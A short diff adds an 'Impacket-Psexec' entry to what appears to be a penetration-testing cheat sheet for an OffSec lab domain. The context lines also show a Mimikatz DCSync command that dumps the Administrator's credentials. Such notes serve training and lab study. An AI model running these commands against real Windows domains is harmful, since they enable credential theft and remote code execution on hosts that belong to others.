@@ -189,3 +189,7 @@ Require domain admin account
 lsadump::dcsync /user:Administrator
 ```
 
+###### Impacket-Psexec
+```
+impacket-psexec offsec.local/allison@192.168.151.59
+```
